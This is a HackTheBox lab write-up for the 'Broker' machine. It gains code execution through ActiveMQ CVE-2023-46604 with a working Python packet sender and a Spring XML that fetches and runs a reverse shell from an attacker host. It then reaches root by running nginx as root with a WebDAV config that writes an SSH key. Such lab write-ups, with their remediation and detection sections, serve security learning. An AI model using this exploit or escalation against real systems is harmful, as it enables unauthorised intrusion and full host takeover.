---
layout: default
title: "HackTheBox - Broker"
---

# HackTheBox - Broker

**OS:** Linux (Ubuntu 22.04)

Broker runs Apache ActiveMQ 5.15.15 behind an nginx reverse proxy. That version is vulnerable
to CVE-2023-46604, an unauthenticated remote code execution flaw in the OpenWire protocol
(TCP 61616) that lets an attacker make the broker instantiate an arbitrary Spring
`ClassPathXmlApplicationContext` from an attacker hosted XML, executing a command as the
`activemq` user. From that foothold, `sudo -l` shows `activemq` may run `/usr/sbin/nginx` as
root with no password. Because the system nginx is built with the WebDAV module, a root nginx
instance configured with `dav_methods PUT` and `user root` can write arbitrary root-owned files,
which is used to drop an SSH key into `/root/.ssh/authorized_keys` and log in as root.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (broker) |
| Initial Access | Apache ActiveMQ OpenWire deserialization RCE (CVE-2023-46604) |
| Privilege Escalation | `sudo nginx` with attacker config -> WebDAV PUT writes root's authorized_keys |
| Final Access | `root` |

## Recon

### Port Scan

```
v0idravl@v0idf0rge:~$ nmap -sV --top-ports 100 -T4 <target-ip>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

The top ports show only SSH and HTTP, but a full TCP sweep reveals the ActiveMQ service ports:

```
v0idravl@v0idf0rge:~$ nmap -p- --min-rate 5000 -T4 <target-ip>
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
1883/tcp  open  mqtt          # MQTT
5672/tcp  open  amqp          # AMQP
8161/tcp  open  patrol-snmp   # ActiveMQ web console
61613/tcp open  unknown       # STOMP
61614/tcp open  unknown       # STOMP over WebSocket
61616/tcp open  unknown       # OpenWire  <-- CVE-2023-46604
```

| Port | Service | Notes |
|---|---|---|
| 22 | SSH | OpenSSH 8.9p1 |
| 80 | HTTP | nginx reverse proxy to the ActiveMQ console |
| 1883 | MQTT | ActiveMQ transport |
| 5672 | AMQP | ActiveMQ transport |
| 8161 | HTTP | ActiveMQ admin console |
| 61613 / 61614 | STOMP | ActiveMQ transports |
| 61616 | OpenWire | ActiveMQ native protocol, the RCE surface |

> **Why this fingerprint matters:** the cluster of 1883/5672/61613/61614/61616 around an HTTP
> console is the unmistakable signature of Apache ActiveMQ. 61616 (OpenWire) is the port that
> carries CVE-2023-46604.

### Identifying the version

Port 80 returns an HTTP basic-auth challenge whose realm names the product:

```
v0idravl@v0idf0rge:~$ curl -s -I http://<target-ip>/
HTTP/1.1 401 Unauthorized
Server: nginx/1.18.0 (Ubuntu)
WWW-Authenticate: basic realm="ActiveMQRealm"
```

The console accepts the default `admin:admin` credentials, and the welcome page prints the exact
build:

```
v0idravl@v0idf0rge:~$ curl -s -u admin:admin http://<target-ip>/admin/index.jsp | grep -o '5\.[0-9.]*'
5.15.15
```

> **Why this matters:** CVE-2023-46604 is fixed in 5.15.16, 5.16.7, 5.17.6, and 5.18.3. ActiveMQ
> 5.15.15 is one release below the fix and fully vulnerable. The exploit targets the OpenWire
> port directly and does **not** need the console credentials, but the console is the quickest
> way to pin the version.

## Initial Access

### CVE-2023-46604 - OpenWire deserialization RCE

The OpenWire marshaller trusts a class name supplied in the wire packet and instantiates it via
reflection. By sending a crafted packet that names
`org.springframework.context.support.ClassPathXmlApplicationContext` with a URL argument, the
broker fetches an attacker hosted Spring XML and processes its bean definitions. A bean that
constructs a `java.lang.ProcessBuilder` with `init-method="start"` runs an arbitrary command.

The malicious Spring XML (hosted on the attack box) runs a base64-encoded reverse shell to avoid
XML-unsafe characters:

```xml
<!-- poc.xml -->
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>/bin/bash</value>
        <value>-c</value>
        <value>echo <base64-reverse-shell> | base64 -d | bash</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

The OpenWire packet is built by hand (the structure: marshaller type `1f`, the class-name
string, then the URL string, all length-prefixed). This sender was written from the public PoC
structure rather than running a third-party binary:

```python
# exploit.py
import socket, sys
ip, port, url = sys.argv[1], int(sys.argv[2]), sys.argv[3]
cls = "org.springframework.context.support.ClassPathXmlApplicationContext"
h  = lambda s: s.encode().hex()
i4 = lambda n: format(n, '04x'); i8 = lambda n: format(n, '08x')
body = "1f00000000000000000001" + "01" + i4(len(cls)) + h(cls) + "01" + i4(len(url)) + h(url)
payload = i8(len(body)//2) + body
s = socket.socket(); s.connect((ip, port)); s.send(bytes.fromhex(payload)); s.close()
```

With a Python `http.server` hosting `poc.xml` and a `nc` listener ready:

```
v0idravl@v0idf0rge:~$ python3 -m http.server 8000 --bind <lhost> &
v0idravl@v0idf0rge:~$ nc -lvnp 4444 &
v0idravl@v0idf0rge:~$ python3 exploit.py <target-ip> 61616 "http://<lhost>:8000/poc.xml"
[*] sent OpenWire RCE packet -> <target-ip>:61616  xml=http://<lhost>:8000/poc.xml

# http.server log: the broker pulls the XML
<target-ip> - - "GET /poc.xml HTTP/1.1" 200 -

# listener catches the shell
connect to [<lhost>] from (UNKNOWN) [<target-ip>] 60596
activemq@broker:/opt/apache-activemq-5.15.15/bin$ id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
```

> **Why this works:** OpenWire performs no validation that the supplied class is safe to
> instantiate. `ClassPathXmlApplicationContext` is a Spring "gadget" because its constructor
> loads and evaluates a remote bean-definition file, and Spring will happily build a
> `ProcessBuilder` whose `start()` method runs a command. The base64 wrapper keeps the reverse
> shell free of `<`, `>`, and `&` that would break the XML.

### Stabilising access

To get a clean, repeatable shell I dropped an SSH key for `activemq` (re-firing the exploit with
a key-install command instead of the reverse shell):

```
activemq@broker:~$ mkdir -p ~/.ssh && echo '<attacker-pubkey>' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
v0idravl@v0idf0rge:~$ ssh -i id_ed25519 activemq@<target-ip>
activemq@broker:~$ cat ~/user.txt
<user-flag-redacted>
```

## Privilege Escalation

### sudo nginx + WebDAV PUT

```
activemq@broker:~$ sudo -n -l
User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

`activemq` can launch nginx as root. The system nginx is built with the WebDAV module:

```
activemq@broker:~$ nginx -V 2>&1 | tr ' ' '\n' | grep dav
--with-http_dav_module
```

> **The idea:** start a second, attacker-controlled nginx master as root. With `user root;` its
> worker also runs as root, and a location with `dav_methods PUT;` lets us write arbitrary
> files owned by root anywhere on disk. `autoindex on` additionally lets the same root worker
> **read** any file (a `GET /root/root.txt` would return the flag directly), but writing an SSH
> key gives a full root shell.

The attacker config (separate port, pid, and temp paths so it does not collide with the running
production nginx):

```nginx
# /tmp/r.conf
user root;
worker_processes 1;
pid /tmp/ngx_root.pid;
error_log /tmp/ngx_err.log;
events { worker_connections 64; }
http {
  client_body_temp_path /tmp/ngx_body;
  access_log /tmp/ngx_acc.log;
  server {
    listen 127.0.0.1:8888;
    root /;
    autoindex on;
    dav_methods PUT DELETE MKCOL COPY MOVE;
    create_full_put_path on;
    dav_access user:rw;          # 600 - so sshd StrictModes accepts the key file
  }
}
```

> **Gotcha worth recording:** `dav_access` controls the mode of files created by PUT. The obvious
> `user:rw group:rw all:rw` produces a world-writable (`0666`) file, and sshd's StrictModes
> **rejects** an `authorized_keys` that others can write. Using `dav_access user:rw;` yields a
> `0600` root-owned file that sshd accepts.

Start the root nginx and PUT the key into root's `authorized_keys`:

```
activemq@broker:~$ sudo /usr/sbin/nginx -t -c /tmp/r.conf
nginx: configuration file /tmp/r.conf test is successful
activemq@broker:~$ sudo /usr/sbin/nginx -c /tmp/r.conf
activemq@broker:~$ curl -s -X PUT http://127.0.0.1:8888/root/.ssh/authorized_keys \
                       --data-binary @/tmp/k.pub -w '%{http_code}\n'
204
```

`create_full_put_path on` creates `/root/.ssh` if needed, and the root worker writes the file as
`root:root` mode `0600`. SSH straight in as root:

```
v0idravl@v0idf0rge:~$ ssh -i id_ed25519 root@<target-ip>
root@broker:~# id
uid=0(root) gid=0(root) groups=0(root)
root@broker:~# cat /root/root.txt
<root-flag-redacted>
```

## Root Cause

1. **CVE-2023-46604 (ActiveMQ):** the OpenWire protocol deserialises a class name from the wire
   and instantiates it by reflection with no allowlist, so an attacker can reach
   `ClassPathXmlApplicationContext` and load a remote Spring bean definition that spawns a
   process. ActiveMQ 5.15.15 predates the fix.
2. **Over-permissive sudo + dangerous binary:** `activemq` is allowed to run `/usr/sbin/nginx`
   as root. nginx with the WebDAV module is effectively an arbitrary file read/write primitive
   when an attacker controls its configuration, so a NOPASSWD sudo rule for it is equivalent to
   granting root.

## Impact

Unauthenticated network attacker gains code execution as the message-broker service account and
escalates to full root, exposing every queue, credential, and file on the host and any system
reachable from it.

## Remediation

Priority ordered. The first two items break the chain; the rest are hardening.

1. **Update Apache ActiveMQ** to 5.15.16 / 5.16.7 / 5.17.6 / 5.18.3 or later to close
   CVE-2023-46604.
2. **Remove the `sudo nginx` rule.** No service account should be able to run nginx (or any
   binary that reads or writes arbitrary files under a config it controls) as root via sudo.
3. **Firewall the OpenWire port (61616)** so it is not reachable from untrusted networks; expose
   only the transports clients actually need.
4. **Change the default `admin:admin` console credentials** and restrict console access.
5. **Run the broker and nginx as dedicated low-privilege users** and review all sudo rules for
   GTFOBins-style abuse.

### Validation

- Sending the OpenWire `ClassPathXmlApplicationContext` packet no longer triggers an outbound
  HTTP fetch (post-update).
- `sudo -l` as `activemq` lists no entries.
- `nc 61616` from an untrusted source is filtered.

## Detection Opportunities

- **Outbound HTTP from the broker:** ActiveMQ fetching an XML over HTTP (especially to an
  external/odd host) right after an inbound 61616 connection is the CVE-2023-46604 signature.
- **Process lineage:** `java`/ActiveMQ spawning `bash`/`ProcessBuilder` children is highly
  abnormal for a broker and should alert.
- **Sudo + nginx:** any `sudo ... nginx -c <path outside /etc/nginx>` invocation, or a second
  nginx master with `user root;`, is suspicious. Audit `execve` of `/usr/sbin/nginx` by non-root
  users.
- **authorized_keys writes:** modification of `/root/.ssh/authorized_keys` by an nginx worker is
  a clear compromise indicator.

## Lessons Learned

- The high-port cluster (61613/61614/61616 + console) instantly identifies ActiveMQ; do not stop
  at a top-ports scan when SSH/HTTP look boring.
- "Run a known service as root via sudo" is almost always game over when that service can be
  pointed at an attacker-controlled config. nginx + the WebDAV module is a clean arbitrary
  file-write primitive.
- Mind file modes when planting `authorized_keys`: sshd StrictModes silently ignores keys in a
  group/world-writable file. `dav_access user:rw;` is the difference between root and a confusing
  dead end.

## Cleanup

- Killed the attacker nginx master started via sudo (`sudo nginx -c /tmp/r.conf -s stop`) and
  removed `/tmp/r.conf`, `/tmp/k.pub`, and the `/tmp/ngx_*` runtime files.
- Removed the SSH keys planted in `/home/activemq/.ssh/authorized_keys` and
  `/root/.ssh/authorized_keys`.
- Stopped the attack-box `http.server` and `nc` listeners. The Spring XML was fetched into the
  broker's memory only; nothing from it persisted on disk. No accounts or services were modified
  beyond the temporary nginx instance, which was stopped.
